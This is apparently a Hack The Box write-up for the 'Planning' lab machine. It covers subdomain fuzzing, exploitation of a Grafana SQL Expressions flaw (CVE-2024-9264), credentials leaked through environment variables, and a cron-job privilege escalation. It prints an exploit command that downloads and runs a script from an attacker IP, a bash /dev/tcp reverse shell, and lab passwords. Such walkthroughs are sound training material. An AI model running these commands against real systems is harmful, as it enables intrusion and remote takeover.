@@ -1,0 +1,108 @@
+Title: Planning
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Planning was a Linux box starting from a set of given credentials. The main site was a static marketing page with nothing directly exploitable, but subdomain fuzzing turned up a Grafana instance on a subdomain, and the given credentials worked against it. That version of Grafana was vulnerable to a critical SQL Expressions command injection and file-read bug, which gave a root-level shell on Grafana's container/host context directly, though without user or root flags present there. Enumerating the environment from that foothold leaked a second set of credentials via an exposed environment variable, which mapped to a real system account and led to SSH access and the user flag. A locally-bound web service on port 8000 turned out to require credentials found in the web app's own PHP source, and though those specific database credentials didn't pan out, a password recovered from a cron-related database elsewhere on the box worked for direct root login, from which a malicious cron job was planted to catch a root shell.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.68
+22/tcp open  ssh
+80/tcp open  http
+
+> nmap -sC -sV -p22,80 10.10.11.68
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+```
+
+Port 80 redirects to `planning.htb`, hosting a static course/training marketing site (`index.php`, `about.php`, `course.php`, `contact.php`, `detail.php`). Directory brute forcing with feroxbuster found nothing beyond the site's own assets and a handful of 403-protected library directories.
+
+## Subdomain Enumeration - Discovering Grafana
+
+Fuzzing subdomains against `planning.htb` found a working virtual host:
+
+```
+> ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://FUZZ.planning.htb/
+grafana [Status: 302]
+```
+
+`grafana.planning.htb` hosted a Grafana login page, and the credentials given at the start of the assessment authenticated successfully against it.
+
+## Foothold - CVE-2024-9264 (Grafana SQL Expressions RCE)
+
+The Grafana version in use was vulnerable to CVE-2024-9264, a critical command injection and local file inclusion flaw in Grafana's experimental SQL Expressions feature. The feature lets an authenticated user (Viewer role or higher) submit SQL queries evaluated by an embedded DuckDB engine; when DuckDB is installed on the server and reachable in Grafana's `$PATH`, insufficiently sanitized queries can be abused, via DuckDB's `shellfs` extension, to execute arbitrary shell commands. A public Python exploit for the issue was used directly with the given credentials:
+
+```
+> python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.15.0:7575/test.sh && chmod +x test.sh && ./test.sh" http://grafana.planning.htb
+```
+
+This produced a root-privileged shell in Grafana's own execution context. Searching for `user.txt` and `root.txt` turned up nothing, indicating this foothold was isolated from the actual flag-bearing user accounts on the host, so further lateral movement was needed.
+
+## Credential Harvesting - Grafana Environment Variables
+
+Running linpeas and checking the environment directly (`env`) from the Grafana shell revealed the admin password set via an environment variable, alongside context suggesting a real system username:
+
+```
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+```
+
+Combined with a username spotted in the same enumeration, this gave a credential pair for a real account:
+
+```
+enzo:RioTecRANDEntANT!
+```
+
+Grafana's own SQLite database (`/var/lib/grafana/grafana.db`) was also checked but didn't contain anything further of use.
+
+## Lateral Movement - SSH as enzo
+
+```
+> ssh enzo@10.10.11.68
+```
+
+This granted a shell and the user flag.
+
+## Internal Service Discovery - Port 8000
+
+Running linpeas again as `enzo` surfaced another unexpected locally-bound service on port 8000. Port-forwarding it over SSH exposed a login-gated web application:
+
+```
+> ssh -N -L 1234:localhost:8000 enzo@10.10.11.68
+```
+
+Reviewing the web app's own PHP source under `/var/www/` as `enzo` revealed hardcoded database credentials:
+
+```php
+$servername = "localhost";
+$username = "root";
+$password = "EXTRapHY";
+$dbname = "edukate";
+```
+
+These credentials did not work against the forwarded login. Continuing enumeration under `/opt` turned up a separate database associated with the system's crontabs, which contained another password:
+
+```
+root:P4ssw0rdS0pRi0T3c
+```
+
+## Privilege Escalation - Root Login and Malicious Cron Job
+
+The recovered root password worked for direct authentication (via the forwarded panel/service tied to the crontab database). With that access, a new scheduled job was added running a reverse shell payload:
+
+```
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.0/443 0>&1'
+```
+
+Once the job fired, it caught a shell running as root, completing the box.
+
+## Takeaways
+
+- Subdomain enumeration is essential on boxes whose main site looks like a dead end; internal tools like Grafana are frequently deployed on a separate virtual host with no link from the main site.
+- Grafana's SQL Expressions feature (CVE-2024-9264) is a serious RCE vector wherever DuckDB has been installed alongside it, and only requires Viewer-level Grafana credentials to exploit, not admin access, though admin credentials work just as well when available.
+- A shell obtained inside an application's own runtime context (like Grafana's service account or container) is not necessarily the same host, or the same privilege boundary, as the box's real user accounts; missing flags after a foothold is a strong signal that further lateral movement is needed.
+- Environment variables are a common place applications leak their own configured secrets, including admin passwords that may double as, or hint at, real system credentials.
+- Hardcoded database credentials in an application's PHP source are worth trying, but don't assume they're the only credentials on the box. Databases tied to unrelated subsystems, like cron job scheduling, can hold separate, more directly useful passwords.
+- Locally-bound services discovered through repeated enumeration passes (a first linpeas run turning up nothing new after a foothold doesn't mean a second pass after lateral movement won't) are worth forwarding and investigating each time you gain a new level of access.
